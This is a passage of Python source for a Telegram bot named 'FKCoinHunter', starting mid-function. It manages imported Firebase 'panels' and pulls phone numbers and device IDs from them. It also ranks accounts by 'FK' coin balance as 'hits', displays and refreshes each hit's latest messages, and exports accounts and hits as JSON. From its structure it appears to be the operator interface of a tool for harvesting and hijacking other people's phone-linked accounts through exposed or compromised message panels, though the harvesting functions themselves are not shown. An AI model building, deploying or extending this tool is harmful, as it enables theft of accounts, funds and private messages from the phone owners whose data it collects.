    return InlineKeyboardMarkup(kb)


def _sorted_hits(sort: str) -> List[Dict]:
    hits = am.hit_manager.get_hits()
    if sort == 'balance':
        hits.sort(key=lambda h: (h.get('fk_balance') or 0,
                                 h.get('created_at') or ''), reverse=True)
    elif sort == 'phone':
        hits.sort(key=lambda h: h.get('phone') or '')
    else:
        hits.sort(key=lambda h: h.get('created_at') or '', reverse=True)
    return hits


def hits_kb(page: int = 0, per_page: int = 8, sort: str = 'date'):
    hits = _sorted_hits(sort)
    total = len(hits)
    start = page * per_page
    end = min(start + per_page, total)
    total_pages = max(1, (total + per_page - 1) // per_page)

    kb = []
    for h in hits[start:end]:
        phone = h.get('phone') or 'unknown'
        bal = h.get('fk_balance') or 0
        kb.append([InlineKeyboardButton(
            f"⭐ {phone} • {bal} FK",
            callback_data=f"hv_{sort}_{phone}"
        )])

    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton(
            "⬅️ Prev", callback_data=f"hits_page_{page-1}_{sort}"))
    if end < total:
        nav.append(InlineKeyboardButton(
            "Next ➡️", callback_data=f"hits_page_{page+1}_{sort}"))
    if nav:
        kb.append(nav)

    sorts = []
    for lbl, key in [("📅 Date", "date"), ("💰 Balance", "balance"), ("📱 Phone", "phone")]:
        if key == sort:
            sorts.append(InlineKeyboardButton(f"• {lbl} •",
                                              callback_data=f"hits_page_0_{key}"))
        else:
            sorts.append(InlineKeyboardButton(lbl,
                                              callback_data=f"hits_page_0_{key}"))
    kb.append(sorts)

    kb.append([InlineKeyboardButton("📤 Export Hits", callback_data="export_hits"),
               InlineKeyboardButton("🔙 Back", callback_data="menu")])

    return InlineKeyboardMarkup(kb), total, page, total_pages, sort


def _hit_detail_text(h: Dict, idx: int) -> str:
    phone = _esc(h.get('phone') or '?')
    bal = h.get('fk_balance') or 0
    uname = _esc(h.get('username') or '?')
    uid = _esc(h.get('user_id') or '?')
    created = h.get('created_at') or '?'
    created = _esc(created[:19] if isinstance(created, str) else created)
    fburi = h.get('firebase_url') or '?'
    fburi_short = _esc(fburi[:40] + "…" if len(fburi) > 40 else fburi)

    msgs = ""
    raw_msgs = h.get('messages') or []
    if raw_msgs:
        for m in raw_msgs[:5]:
            sender = _esc(m.get('sender') or 'Unknown')
            full = str(m.get('text') or '')
            txt = full[:80] + ("…" if len(full) > 80 else "")
            txt = _esc(txt)
            msgs += f"\n• <b>{sender}</b>: {txt}"
    else:
        msgs = "\n<i>No messages cached — tap Refresh.</i>"

    return (
        f"⭐ <b>Hit #{idx+1}</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"📱 <code>{phone}</code>\n"
        f"💰 <b>{bal} FK</b>\n"
        f"👤 {uname}\n"
        f"🆔 UID: <code>{uid}</code>\n"
        f"📅 {created}\n"
        f"📡 Panel: <code>{fburi_short}</code>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"📨 <b>Last 5 messages:</b>{msgs}"
    )


def hit_detail_kb(phone: str, sort: str):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔄 Refresh Messages",
                              callback_data=f"hr_{sort}_{phone}")],
        [InlineKeyboardButton("🔙 Back to Hits",
                              callback_data=f"hits_page_0_{sort}")]
    ])


def accounts_kb(page=0, per_page=8):
    accs = am.get_accounts()
    accs.sort(key=lambda a: (a.get('fk_balance') or 0,
                             a.get('created_at') or ''), reverse=True)
    total = len(accs)
    start = page * per_page
    end = min(start + per_page, total)
    lines = []
    for a in accs[start:end]:
        bal = a.get('fk_balance') or 0
        tag = "⭐" if bal >= HIT_THRESHOLD else "•"
        lines.append(f"{tag} <code>{_esc(a.get('phone','?'))}</code> — <b>{bal} FK</b>")
    kb = []
    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"acc_page_{page-1}"))
    if end < total:
        nav.append(InlineKeyboardButton("Next ➡️", callback_data=f"acc_page_{page+1}"))
    if nav:
        kb.append(nav)
    kb.append([InlineKeyboardButton("📤 Export Accounts", callback_data="export_acc"),
               InlineKeyboardButton("🔙 Back", callback_data="menu")])
    return InlineKeyboardMarkup(kb), lines, total, page, per_page


def logs_kb(filter_type='all'):
    types = [("All", "all", "📜"), ("Errors", "error", "❌"),
             ("Hits", "hit", "⭐"), ("Success", "success", "✅")]
    row = []
    for lbl, key, icon in types:
        prefix = "• " if key == filter_type else ""
        suffix = " •" if key == filter_type else ""
        row.append(InlineKeyboardButton(
            f"{prefix}{icon} {lbl}{suffix}",
            callback_data=f"logs_filter_{key}"))
    return InlineKeyboardMarkup([
        row,
        [InlineKeyboardButton("🔄 Refresh",
                              callback_data=f"logs_filter_{filter_type}"),
         InlineKeyboardButton("🗑 Clear", callback_data="logs_clear")],
        [InlineKeyboardButton("🔙 Back", callback_data="menu")]
    ])


def panel_add_source_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("✍️ Paste URL(s)", callback_data="panel_add_text")],
        [InlineKeyboardButton("📁 Upload .txt File", callback_data="panel_add_file")],
        [InlineKeyboardButton("📁 Upload .json File", callback_data="panel_add_file")],
        [InlineKeyboardButton("🔙 Cancel", callback_data="panels_menu")],
    ])


def help_text():
    return (
        "❓ <b>FKCoinHunter Help</b>\n"
        "━━━━━━━━━━━━━━━━━━\n"
        "<b>Commands</b>\n"
        "/start — Main menu\n"
        "/status — Live status\n"
        "/addpanel — Add panels (paste or upload)\n"
        "/panels — Manage panels\n"
        "/hits — View hits\n"
        "/accounts — View accounts\n"
        "/logs — Recent logs\n"
        "/start_auto — Start\n"
        "/stop_auto — Stop\n"
        "/export_accounts — Download accounts JSON\n"
        "/export_hits — Download hits JSON\n\n"
        "<b>Panel import formats</b>\n"
        "• Plain Firebase URL\n"
        "<code>https://xxx.firebaseio.com/</code>\n"
        "• Encoded URL\n"
        "<code>https://...?s=base64encoded</code>\n"
        "• .txt file — one URL per line (# for comments)\n"
        "• .json file — array of URLs or {'urls': [...]}\n\n"
        "<b>Thresholds</b>\n"
        f"• Saved ≥ <b>{MIN_FK_BALANCE} FK</b>\n"
        f"• Hit ≥ <b>{HIT_THRESHOLD} FK</b>\n"
        f"• Workers: <b>{MAX_WORKERS}</b> concurrent"
    )


# ============ COMMANDS ============
async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    global admin_chat_id
    chat_id = update.effective_chat.id
    if ADMIN_ID and chat_id != ADMIN_ID:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    admin_chat_id = chat_id
    await update.message.reply_text(
        "🦅 <b>FKCoinHunter Bot</b>\n\n"
        f"⚙️ Workers: <b>{MAX_WORKERS}</b> concurrent\n"
        f"🎯 Hit threshold: <b>{HIT_THRESHOLD} FK</b>\n"
        f"💾 Saved threshold: <b>{MIN_FK_BALANCE} FK</b>\n"
        f"📡 Panels: <b>{len(dm.get_panels())}</b>\n"
        f"⭐ Hits: <b>{len(am.hit_manager.hits)}</b>\n\n"
        "Use the menu below.",
        parse_mode=ParseMode.HTML, reply_markup=main_menu_kb()
    )


async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        help_text(), parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("🏠 Menu", callback_data="menu")
        ]])
    )


async def cmd_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        status_text(), parse_mode=ParseMode.HTML, reply_markup=main_menu_kb()
    )


async def cmd_addpanel(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if ctx.args:
        urls = " ".join(ctx.args).replace(",", " ").split()
        urls = [u for u in urls if u.strip()]
        added, failed = dm.add_databases(urls)
        await update.message.reply_text(
            f"✅ Added <b>{added}</b> panel(s)."
            + (f"\n⚠️ Skipped/failed: <b>{failed}</b>" if failed else "")
            + f"\n\n📡 Total panels: <b>{len(dm.get_panels())}</b>",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("📡 View Panels", callback_data="panels_menu")
            ]])
        )
        return
    await update.message.reply_text(
        "📥 <b>Add Panels</b>\n\nChoose how you'd like to add panels:",
        parse_mode=ParseMode.HTML, reply_markup=panel_add_source_kb()
    )


async def cmd_panels(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"📡 <b>Panel Manager</b>\n"
        f"Total: <b>{len(dm.get_panels())}</b> • "
        f"Active: <b>#{dm.current_panel_index + 1 if dm.get_panels() else 0}</b>\n\n"
        "Tap a panel to activate.",
        parse_mode=ParseMode.HTML, reply_markup=panels_kb()
    )


async def cmd_hits(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    kb, total, page, total_pages, sort = hits_kb(0)
    if total == 0:
        await update.message.reply_text(
            "⭐ <b>No hits yet</b>\n\n"
            f"Hits are accounts with balance ≥ <b>{HIT_THRESHOLD} FK</b>.",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("🏠 Menu", callback_data="menu")
            ]])
        )
        return
    await update.message.reply_text(
        f"⭐ <b>Hits</b> — {total} total\n"
        f"<i>Page 1/{total_pages} • sorted by {sort}</i>",
        parse_mode=ParseMode.HTML, reply_markup=kb
    )


async def cmd_accounts(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    kb, lines, total, page, per_page = accounts_kb(0)
    total_pages = max(1, (total + per_page - 1) // per_page)
    body = (f"👤 <b>Accounts</b> — {total} total\n"
            f"<i>Page 1/{total_pages}</i>\n\n" +
            ("\n".join(lines) if lines else "<i>No accounts yet.</i>"))
    await update.message.reply_text(
        body, parse_mode=ParseMode.HTML, reply_markup=kb)


async def cmd_logs(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    logs = auto_status['processing_logs'][-30:]
    body = "📜 <b>Logs</b> (all)\n\n" + (
        "\n".join(
            f"<code>{_esc(l['timestamp'])}</code> {_esc(l['message'][:100])}"
            for l in logs
        ) if logs else "<i>No logs yet.</i>"
    )
    if len(body) > 3800:
        body = body[-3800:]
    await update.message.reply_text(
        body, parse_mode=ParseMode.HTML, reply_markup=logs_kb('all'))


async def cmd_start_auto(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not dm.get_current_panel():
        await update.message.reply_text(
            "⚠️ No panel selected. Use /addpanel first.",
            reply_markup=main_menu_kb())
        return
    if worker.start():
        await update.message.reply_text("🚀 Automation started.",
                                        reply_markup=main_menu_kb())
    else:
        await update.message.reply_text("Already running.")


async def cmd_stop_auto(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    worker.stop()
    await update.message.reply_text("⏹ Stopped.", reply_markup=main_menu_kb())


async def cmd_export_accounts(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not am.accounts:
        await update.message.reply_text("No accounts to export.")
        return
    path = os.path.join(DATA_DIR,
                        f"accounts_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
    with open(path, 'w', encoding='utf-8') as f:
        json.dump([a.to_dict() for a in am.accounts], f, indent=2, ensure_ascii=False)
    await update.message.reply_document(document=InputFile(path),
                                        filename=os.path.basename(path))
    os.remove(path)


async def cmd_export_hits(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    hits = am.hit_manager.get_hits()
    if not hits:
        await update.message.reply_text("No hits to export.")
        return
    path = os.path.join(DATA_DIR,
                        f"hits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
    with open(path, 'w', encoding='utf-8') as f:
        json.dump(hits, f, indent=2, ensure_ascii=False)
    await update.message.reply_document(document=InputFile(path),
                                        filename=os.path.basename(path))
    os.remove(path)


# ============ FILE UPLOAD ============
async def on_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    try:
        doc = update.message.document
        if not doc:
            return
        filename = (doc.file_name or "").lower()
        if not (filename.endswith('.txt') or filename.endswith('.json')):
            await update.message.reply_text(
                "⚠️ Only <b>.txt</b> or <b>.json</b> files are accepted.",
                parse_mode=ParseMode.HTML)
            return

        file = await doc.get_file()
        content = await file.download_as_bytearray()
        try:
            text = content.decode('utf-8', errors='ignore')
        except Exception:
            await update.message.reply_text("❌ Could not read file.")
            return

        urls = (parse_urls_from_json(text) if filename.endswith('.json')
                else parse_urls_from_text(text))

        if not urls:
            await update.message.reply_text(
                "⚠️ No valid panel URLs found.\n\n"
                "<b>Accepted formats:</b>\n"
                "• Plain Firebase URL\n"
                "• URL with <code>?s=</code> parameter\n"
                "• One per line (<code>#</code> for comments)",
                parse_mode=ParseMode.HTML)
            return

        seen, unique = set(), []
        for u in urls:
            if u not in seen:
                seen.add(u)
                unique.append(u)

        ctx.user_data['pending_urls'] = unique

        preview_lines = []
        for u in unique[:10]:
            short = u if len(u) <= 55 else u[:52] + "…"
            preview_lines.append(f"• <code>{_esc(short)}</code>")
        if len(unique) > 10:
            preview_lines.append(f"<i>…and {len(unique) - 10} more</i>")

        await update.message.reply_text(
            f"📋 <b>Found {len(unique)} panel URL(s)</b>\n\n"
            + "\n".join(preview_lines) + "\n\nAdd these panels?",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton(f"✅ Add {len(unique)} Panel(s)",
                                      callback_data="panel_confirm_add")],
                [InlineKeyboardButton("❌ Cancel", callback_data="panels_menu")]
            ])
        )
    except Exception as e:
        logger.exception("on_document")
        await update.message.reply_text(f"❌ Error: {_esc(str(e)[:200])}")


# ============ CALLBACK DISPATCHER ============
async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    try:
        await q.answer()
    except Exception:
        pass
    try:
        await _dispatch_callback(q, ctx)
    except Exception as e:
        logger.exception(f"Callback {q.data} failed")
        try:
            await q.edit_message_text(
                f"❌ <b>Error</b>\n<code>{_esc(str(e)[:300])}</code>",
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("🏠 Menu", callback_data="menu")
                ]])
            )
        except Exception:
            try:
                await q.message.reply_text(
                    f"❌ Error: {_esc(str(e)[:300])}",
                    reply_markup=InlineKeyboardMarkup([[
                        InlineKeyboardButton("🏠 Menu", callback_data="menu")
                    ]])
                )
            except Exception:
                pass


async def _dispatch_callback(q, ctx):
    data = q.data or ""

    # ===== NAVIGATION =====
    if data == "menu":
        await q.edit_message_text(status_text(),
                                  parse_mode=ParseMode.HTML,
                                  reply_markup=main_menu_kb())
        return

    if data == "status":
        await q.edit_message_text(status_text(),
                                  parse_mode=ParseMode.HTML,
                                  reply_markup=main_menu_kb())
        return

    if data == "help_menu":
        await q.edit_message_text(
            help_text(), parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("🏠 Menu", callback_data="menu")
            ]]))
        return

    # ===== AUTOMATION =====
    if data == "start_auto":
        if not dm.get_current_panel():
            await q.edit_message_text(
                "⚠️ No panel selected. Add one first.",
                reply_markup=panels_kb())
            return
        worker.start()
        await asyncio.sleep(0.3)
        await q.edit_message_text(status_text(),
                                  parse_mode=ParseMode.HTML,
                                  reply_markup=main_menu_kb())
        return

    if data == "stop_auto":
        worker.stop()
        await asyncio.sleep(0.3)
        await q.edit_message_text(status_text(),
                                  parse_mode=ParseMode.HTML,
                                  reply_markup=main_menu_kb())
        return

    # ===== PANELS =====
    if data == "panels_menu":
        await q.edit_message_text(
            f"📡 <b>Panel Manager</b>\n"
            f"Total: <b>{len(dm.get_panels())}</b> • "
            f"Active: <b>#{dm.current_panel_index + 1 if dm.get_panels() else 0}</b>\n\n"
            "Tap a panel to activate.",
            parse_mode=ParseMode.HTML, reply_markup=panels_kb())
        return

    if data == "panel_add":
        ctx.user_data['awaiting'] = None
        await q.edit_message_text(
            "📥 <b>Add Panels</b>\n\nChoose how to add:",
            parse_mode=ParseMode.HTML,
            reply_markup=panel_add_source_kb())
        return

    if data == "panel_add_text":
        ctx.user_data['awaiting'] = 'addpanel'
        await q.edit_message_text(
            "✍️ <b>Paste panel URL(s)</b>\n\n"
            "Send one or more URLs (one per line or comma-separated).\n\n"
            "Supported:\n"
            "• <code>https://xxx.firebaseio.com/</code>\n"
            "• <code>https://...?s=base64</code>",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("🔙 Cancel", callback_data="panel_add")
            ]]))
        return

    if data == "panel_add_file":
        await q.edit_message_text(
            "📁 <b>Upload file</b>\n\n"
            "Send a <b>.txt</b> file — one URL per line "
            "(<code>#</code> lines ignored)\n"
            "or a <b>.json</b> file — array of URLs.\n\n"
            "Or use /addpanel and the bot will wait for a file.",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("🔙 Cancel", callback_data="panel_add")
            ]]))
        return

    if data == "panel_confirm_add":
        urls = ctx.user_data.get('pending_urls') or []
        ctx.user_data['pending_urls'] = None
        if not urls:
            await q.edit_message_text(
                "⚠️ Nothing to add — file was empty or expired.",
                reply_markup=panels_kb())
            return
        added, failed = dm.add_databases(urls)
        await q.edit_message_text(
            f"✅ <b>Added {added} panel(s)</b>"
            + (f"\n⚠️ Failed: {failed}" if failed else "")
            + f"\n\n📡 Total: <b>{len(dm.get_panels())}</b>",
            parse_mode=ParseMode.HTML, reply_markup=panels_kb())
        return

    if data.startswith("panel_view_"):
        try:
            idx = int(data.split("_")[-1])
        except ValueError:
            return
        if dm.set_current_db(idx):
            p = dm.get_current_panel() or {}
            api_key = p.get('api_key') or 'none'
            await q.edit_message_text(
                f"✅ <b>Panel activated</b>\n\n"
                f"📡 <b>{_esc(p.get('name','?'))}</b>\n"
                f"🔗 <code>{_esc(p.get('url','?'))}</code>\n"
                f"🔑 Key: <code>{_esc(api_key[:20])}…</code>\n"
                f"📨 Sender: <b>{_esc(p.get('sender','?'))}</b>",
                parse_mode=ParseMode.HTML,
                reply_markup=panels_kb())
        return

    if data.startswith("panel_del_confirm_"):
        try:
            idx = int(data.split("_")[-1])
        except ValueError:
            return
        panels = dm.get_panels()
        if not (0 <= idx < len(panels)):
            await q.edit_message_text("Panel not found.",
                                       reply_markup=panels_kb())
            return
        p = panels[idx]
        await q.edit_message_text(
            f"🗑 <b>Delete panel?</b>\n\n"
            f"📡 {_esc(p.get('name','?'))}\n"
            f"🔗 <code>{_esc((p.get('url') or '')[:60])}…</code>",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🗑 Yes, delete",
                                      callback_data=f"panel_del_{idx}")],
                [InlineKeyboardButton("❌ Cancel", callback_data="panels_menu")]
            ]))
        return

    if data.startswith("panel_del_"):
        try:
            idx = int(data.split("_")[-1])
        except ValueError:
            return
        dm.remove_database(idx)
        await q.edit_message_text(
            f"🗑 Deleted. Panels left: <b>{len(dm.get_panels())}</b>",
            parse_mode=ParseMode.HTML, reply_markup=panels_kb())
        return

    if data == "panel_clear_all":
        if not dm.get_panels():
            await q.edit_message_text("No panels to clear.",
                                       reply_markup=panels_kb())
            return
        await q.edit_message_text(
            f"⚠️ <b>Delete ALL {len(dm.get_panels())} panels?</b>\n"
            "This cannot be undone.",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🗑 Yes, delete all",
                                      callback_data="panel_clear_all_confirm")],
                [InlineKeyboardButton("❌ Cancel", callback_data="panels_menu")]
            ]))
        return

    if data == "panel_clear_all_confirm":
        dm.panels = []
        dm.current_panel_index = 0
        dm._save()
        auto_status['total_panels'] = 0
        auto_status['panel_index'] = 0
        auto_status['current_panel'] = ''
        await q.edit_message_text("🗑 All panels deleted.",
                                   reply_markup=panels_kb())
        return

    if data == "panel_next":
        if dm.move_to_next_panel():
            p = dm.get_current_panel() or {}
            await q.edit_message_text(
                f"⏭ <b>Panel {dm.current_panel_index+1}/{len(dm.get_panels())}</b>\n\n"
                f"📡 {_esc(p.get('name','?'))}",
                parse_mode=ParseMode.HTML, reply_markup=panels_kb())
        else:
            await q.edit_message_text("No panels.", reply_markup=panels_kb())
        return

    if data == "panel_fetch":
        panel = dm.get_current_panel()
        if not panel:
            await q.edit_message_text("No panel selected.",
                                       reply_markup=panels_kb())
            return
        await q.edit_message_text("🔍 Fetching devices…")
        devices = fetch_phones_from_panel(panel, limit=100)
        if not devices:
            await q.edit_message_text(
                f"⚠️ No active devices in <b>{_esc(panel.get('name','?'))}</b>",
                parse_mode=ParseMode.HTML, reply_markup=panels_kb())
            return
        lines = [f"📋 <b>{len(devices)} devices</b> in {_esc(panel.get('name','?'))}\n"]
        for phone, dev in devices[:30]:
            lines.append(f"📱 <code>{_esc(phone)}</code>  <i>{_esc(dev[:8])}…</i>")
        if len(devices) > 30:
            lines.append(f"\n<i>…and {len(devices)-30} more</i>")
        await q.edit_message_text(
            "\n".join(lines), parse_mode=ParseMode.HTML,
            reply_markup=panels_kb())
        return

    # ===== HITS =====
    if data == "hits_menu":
        kb, total, page, total_pages, sort = hits_kb(0)
        if total == 0:
            await q.edit_message_text(
                "⭐ <b>No hits yet</b>",
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("🏠 Menu", callback_data="menu")
                ]]))
            return
        await q.edit_message_text(
            f"⭐ <b>Hits</b> — {total} total\n"
            f"<i>Page 1/{total_pages} • sorted by {sort}</i>",
            parse_mode=ParseMode.HTML, reply_markup=kb)
        return

    if data.startswith("hits_page_"):
        parts = data.split("_")
        try:
            page = int(parts[2])
            sort = parts[3]
        except (IndexError, ValueError):
            return
        kb, total, page, total_pages, sort = hits_kb(page, sort=sort)
        await q.edit_message_text(
            f"⭐ <b>Hits</b> — {total} total\n"
            f"<i>Page {page+1}/{total_pages} • sorted by {sort}</i>",
            parse_mode=ParseMode.HTML, reply_markup=kb)
        return

    if data.startswith("hv_"):
        parts = data.split("_", 2)
        if len(parts) < 3:
            return
        sort, phone = parts[1], parts[2]
        idx, h = am.hit_manager.get_hit_by_phone(phone)
        if not h:
            await q.edit_message_text(
                "⚠️ Hit not found.\n<i>The list may be outdated.</i>",
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("🔙 Back to Hits",
                                         callback_data=f"hits_page_0_{sort}")
                ]]))
            return
        await q.edit_message_text(
            _hit_detail_text(h, idx),
            parse_mode=ParseMode.HTML,
            reply_markup=hit_detail_kb(phone, sort))
        return

    if data.startswith("hr_"):
        parts = data.split("_", 2)
        if len(parts) < 3:
            return
        sort, phone = parts[1], parts[2]
        await q.answer("Refreshing…")
        updated = am.hit_manager.refresh_messages_by_phone(phone)
        if not updated:
            await q.edit_message_text(
                "⚠️ Hit not found.",
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("🔙 Back to Hits",
                                         callback_data=f"hits_page_0_{sort}")
                ]]))
            return
        idx, _ = am.hit_manager.get_hit_by_phone(phone)
        await q.edit_message_text(
            _hit_detail_text(updated, idx),
            parse_mode=ParseMode.HTML,
            reply_markup=hit_detail_kb(phone, sort))
        return

    # ===== ACCOUNTS =====
    if data == "accounts_menu":
        kb, lines, total, page, per_page = accounts_kb(0)
        total_pages = max(1, (total + per_page - 1) // per_page)
        await q.edit_message_text(
            f"👤 <b>Accounts</b> — {total} total\n"
            f"<i>Page 1/{total_pages}</i>\n\n" +
            ("\n".join(lines) if lines else "<i>No accounts yet.</i>"),
            parse_mode=ParseMode.HTML, reply_markup=kb)
        return

    if data.startswith("acc_page_"):
        try:
            page = int(data.split("_")[-1])
        except ValueError:
            return
        kb, lines, total, page, per_page = accounts_kb(page)
        total_pages = max(1, (total + per_page - 1) // per_page)
        await q.edit_message_text(
            f"👤 <b>Accounts</b> — {total} total\n"
            f"<i>Page {page+1}/{total_pages}</i>\n\n" +
            ("\n".join(lines) if lines else "<i>No accounts.</i>"),
            parse_mode=ParseMode.HTML, reply_markup=kb)
        return

    # ===== LOGS =====
    if data == "logs_menu" or data.startswith("logs_filter_"):
        if data.startswith("logs_filter_"):
            filter_type = data.replace("logs_filter_", "")
        else:
            filter_type = "all"
        logs = auto_status['processing_logs']
        if filter_type != "all":
            logs = [l for l in logs if l['type'] == filter_type]
        logs = logs[-30:]
        body = f"📜 <b>Logs</b> ({filter_type})\n\n" + (
            "\n".join(
                f"<code>{_esc(l['timestamp'])}</code> {_esc(l['message'][:100])}"
                for l in logs
            ) if logs else "<i>No logs.</i>"
        )
        if len(body) > 3800:
            body = body[-3800:]
        await q.edit_message_text(
            body, parse_mode=ParseMode.HTML,
            reply_markup=logs_kb(filter_type))
        return

    if data == "logs_clear":
        auto_status['processing_logs'] = []
        await q.edit_message_text("🗑 Logs cleared.",
                                   reply_markup=logs_kb('all'))
        return

    # ===== EXPORT =====
    if data == "export_menu":
        await q.edit_message_text(
            "📤 <b>Export Data</b>\n\nChoose what to download:",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📄 Accounts JSON",
                                      callback_data="export_acc")],
                [InlineKeyboardButton("⭐ Hits JSON",
                                      callback_data="export_hits")],
                [InlineKeyboardButton("🔙 Back", callback_data="menu")]
            ]))
        return

    if data == "export_acc":
        if not am.accounts:
            await q.answer("No accounts.", show_alert=True)
            return
        path = os.path.join(DATA_DIR,
                            f"accounts_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
        with open(path, 'w', encoding='utf-8') as f:
            json.dump([a.to_dict() for a in am.accounts], f,
                      indent=2, ensure_ascii=False)
        await q.message.reply_document(document=InputFile(path),
                                       filename=os.path.basename(path))
        os.remove(path)
        return

    if data == "export_hits":
        hits = am.hit_manager.get_hits()
        if not hits:
            await q.answer("No hits.", show_alert=True)
            return
        path = os.path.join(DATA_DIR,
                            f"hits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
        with open(path, 'w', encoding='utf-8') as f:
            json.dump(hits, f, indent=2, ensure_ascii=False)
        await q.message.reply_document(document=InputFile(path),
                                       filename=os.path.basename(path))
        os.remove(path)
        return


# ============ TEXT HANDLER ============
async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    state = ctx.user_data.get('awaiting')
    if state == 'addpanel':
        ctx.user_data['awaiting'] = None
        text = update.message.text or ""
        urls = parse_urls_from_text(text)
        if not urls:
            urls = [u.strip() for u in re.split(r'[\s,]+', text) if u.strip()]
        if not urls:
            await update.message.reply_text("❌ No URLs found.")
            return
        seen, unique = set(), []
        for u in urls:
            if u not in seen:
                seen.add(u)
                unique.append(u)
        ctx.user_data['pending_urls'] = unique
        preview = "\n".join(
            f"• <code>{_esc(u if len(u) <= 55 else u[:52] + '…')}</code>"
            for u in unique[:10]
        )
        extra = (f"\n<i>…and {len(unique)-10} more</i>"
                 if len(unique) > 10 else "")
        await update.message.reply_text(
            f"📋 <b>Found {len(unique)} URL(s)</b>\n\n{preview}{extra}\n\nAdd?",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton(f"✅ Add {len(unique)}",
                                      callback_data="panel_confirm_add")],
                [InlineKeyboardButton("❌ Cancel", callback_data="panels_menu")]
            ]))
        return


# ============ HEALTH (Railway) ============
class HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

    def log_message(self, *a):
        pass


def start_health_server():
    port = int(os.getenv("PORT", "8080"))
    try:
        HTTPServer(('0.0.0.0', port), HealthHandler).serve_forever()
    except Exception as e:
        logger.error(f"health: {e}")


async def post_init(application: Application):
    global bot_app, main_loop, admin_chat_id
    bot_app = application
    main_loop = asyncio.get_running_loop()
    if ADMIN_ID:
        admin_chat_id = ADMIN_ID
        logger.info(f"Admin: {ADMIN_ID}")
    logger.info("Bot initialized.")


def main():
    if not BOT_TOKEN:
        print("❌ BOT_TOKEN required!")
        sys.exit(1)

    threading.Thread(target=start_health_server, daemon=True).start()

    app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("addpanel", cmd_addpanel))
    app.add_handler(CommandHandler("panels", cmd_panels))
    app.add_handler(CommandHandler("hits", cmd_hits))
    app.add_handler(CommandHandler("accounts", cmd_accounts))
    app.add_handler(CommandHandler("logs", cmd_logs))
    app.add_handler(CommandHandler("start_auto", cmd_start_auto))
    app.add_handler(CommandHandler("stop_auto", cmd_stop_auto))
    app.add_handler(CommandHandler("export_accounts", cmd_export_accounts))
    app.add_handler(CommandHandler("export_hits", cmd_export_hits))

    app.add_handler(CallbackQueryHandler(on_callback))
    app.add_handler(MessageHandler(filters.Document.ALL, on_document))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))

    logger.info("🦅 FKCoinHunter Bot starting…")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
